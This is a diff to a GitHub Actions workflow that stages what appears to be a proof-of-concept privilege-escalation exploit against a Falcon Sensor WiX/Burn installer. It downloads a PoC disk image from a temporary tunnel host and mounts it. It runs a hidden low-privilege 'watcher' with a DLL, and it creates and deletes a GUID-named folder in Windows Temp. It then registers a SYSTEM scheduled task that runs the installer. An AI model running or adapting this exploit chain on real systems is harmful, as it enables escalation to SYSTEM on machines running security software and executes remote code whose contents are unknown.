@@ -12,12 +12,12 @@ jobs:
         shell: pwsh
         run: |
           $ErrorActionPreference = 'Stop'
-          $u = 'http://zfzcz-2600-1f18-68f7-2200-4028-a48c-c2-27bc.run.pinggy-free.link:37647/falcon-wix-poc.iso'
-          Invoke-WebRequest -Uri $u -OutFile "$env:RUNNER_TEMP\falcon-wix-poc.iso"
-          $h=(Get-FileHash "$env:RUNNER_TEMP\falcon-wix-poc.iso" -Algorithm SHA256).Hash.ToLower()
+          $u = 'http://zfzcz-2600-1f18-68f7-2200-4028-a48c-c2-27bc.run.pinggy-free.link:37647/falcon-wix-poc-v2.iso'
+          Invoke-WebRequest -Uri $u -OutFile "$env:RUNNER_TEMP\falcon-wix-poc-v2.iso"
+          $h=(Get-FileHash "$env:RUNNER_TEMP\falcon-wix-poc-v2.iso" -Algorithm SHA256).Hash.ToLower()
           Write-Host "ISO SHA256=$h"
-          if ($h -ne '0a51ebd4eb630faa3c135eadbfc5e96de2f79f7a88f2c9a6ed74780b169edc0e') { throw 'ISO hash mismatch' }
-          $img=Mount-DiskImage -ImagePath "$env:RUNNER_TEMP\falcon-wix-poc.iso" -PassThru
+          if ($h -ne '335d43f08a8abfcdd1915bcc18458217670b5694af8d64b4e3f2e1a51597a9a8') { throw 'ISO hash mismatch' }
+          $img=Mount-DiskImage -ImagePath "$env:RUNNER_TEMP\falcon-wix-poc-v2.iso" -PassThru
           $drive=(Get-Volume -DiskImage $img).DriveLetter
           if (-not $drive) { throw 'No mounted drive' }
           "POC_DRIVE=$drive" | Out-File -FilePath $env:GITHUB_ENV -Append
@@ -39,6 +39,9 @@ jobs:
           $low=Start-Process -FilePath 'C:\poc\readonly\watcher.exe' -ArgumentList 'C:\poc\readonly\fgba.dll' -Credential $cred -WindowStyle Hidden -PassThru
           Write-Host "Started low watcher PID=$($low.Id)"
           Start-Sleep -Seconds 3
+          New-Item -ItemType Directory -Force 'C:\Windows\Temp\{11111111-1111-1111-1111-111111111111}' | Out-Null
+          Start-Sleep -Seconds 1
+          Remove-Item 'C:\Windows\Temp\{11111111-1111-1111-1111-111111111111}' -Recurse -Force -ErrorAction SilentlyContinue
           $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddDays(1)
           $sysAction=New-ScheduledTaskAction -Execute 'C:\Windows\System32\cmd.exe' -Argument '/d /c "set > C:\poc\results\system-env.txt & C:\poc\readonly\FalconSensor.exe /install /quiet /norestart CID=00000000000000000000000000000000-00 ProvWaitTime=1"'
           Register-ScheduledTask -TaskName BurnSystemInstaller -Action $sysAction -Trigger $trigger -User 'SYSTEM' -RunLevel Highest -Force | Out-Null
